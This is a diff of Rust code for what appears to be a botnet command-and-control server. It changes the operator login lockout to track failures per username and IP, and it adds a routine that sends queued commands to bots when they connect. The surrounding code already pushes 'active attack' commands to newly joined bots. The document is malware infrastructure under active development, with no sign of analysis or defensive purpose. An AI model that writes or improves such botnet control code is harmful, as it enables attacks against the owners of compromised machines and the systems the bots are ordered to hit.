@@ -189,6 +189,11 @@ async fn auth_user_interactive<S>(conn: &mut S, addr: &str, state: &Arc<AppState
 where
     S: AsyncWriteExt + AsyncReadExt + Unpin,
 {
+    // Parse IP from addr string
+    let ip_addr = addr.parse::<std::net::SocketAddr>()
+        .map(|s| s.ip().to_string())
+        .unwrap_or_else(|_| "0.0.0.0".to_string());
+
     for attempt in 1..=3 {
         conn.write_all(b"\x1b[0m\r\n\r\n\r\n\r\n\r\n\r\n\r\n").await?;
         conn.write_all(b"\r                        \x1b[38;5;109m> Auth\x1b[38;5;146ment\x1b[38;5;182micat\x1b[38;5;218mion -- \x1b[38;5;196mReq\x1b[38;5;161muir\x1b[38;5;89med\n").await?;
@@ -221,8 +226,8 @@ where
         username = username.trim().to_string();
         
         // Check if account is locked out
-        if state.login_tracker.is_locked_out(&username).await {
-            let remaining = state.login_tracker.get_lockout_remaining(&username).await;
+        if state.login_tracker.is_locked_out(&username, &ip_addr).await {
+            let remaining = state.login_tracker.get_lockout_remaining(&username, &ip_addr).await;
             let msg = format!("\x1b[38;5;196mAccount temporarily locked. Try again in {} seconds.\n\r", remaining);
             conn.write_all(msg.as_bytes()).await?;
             warn!("Login blocked for {} from {} - account locked", username, addr);
@@ -276,7 +281,7 @@ where
         match state.user_manager.authenticate(&username, &password).await {
             Ok(Some(user)) => {
                 // Clear failed attempts on successful login
-                state.login_tracker.clear_attempts(&username).await;
+                state.login_tracker.clear_attempts(&username, &ip_addr).await;
                 
                 // Log successful authentication
                 let audit = AuditLog::new(
@@ -290,7 +295,7 @@ where
             }
             Ok(None) => {
                 warn!("User not found: {}", username);
-                state.login_tracker.record_failed_attempt(&username).await;
+                state.login_tracker.record_failed_attempt(&username, &ip_addr).await;
                 
                 // Log failed authentication
                 let audit = AuditLog::new(
@@ -302,7 +307,7 @@ where
             }
             Err(e) => {
                 warn!("Auth error for {}: {}", username, e);
-                state.login_tracker.record_failed_attempt(&username).await;
+                state.login_tracker.record_failed_attempt(&username, &ip_addr).await;
                 
                 // Log failed authentication
                 let audit = AuditLog::new(
@@ -439,6 +444,19 @@ pub async fn handle_bot_connection(conn: TcpStream, addr: std::net::SocketAddr, 
             // We can use _bot_arc.cmd_tx
             if let Err(e) = _bot_arc.cmd_tx.send(command).await {
                 warn!("Failed to send active attack to new bot {}: {}", bot_id, e);
+            }
+        }
+    }
+
+    // Send pending commands
+    let pending = state.bot_manager.get_pending_commands(bot_id).await;
+    if !pending.is_empty() {
+        info!("Sending {} pending commands to bot {}", pending.len(), bot_id);
+        for cmd in pending {
+            // Ensure command ends with newline
+            let cmd_to_send = if cmd.ends_with('\n') { cmd } else { format!("{}\n", cmd) };
+            if let Err(e) = _bot_arc.cmd_tx.send(cmd_to_send).await {
+                warn!("Failed to send pending command to bot {}: {}", bot_id, e);
             }
         }
     }
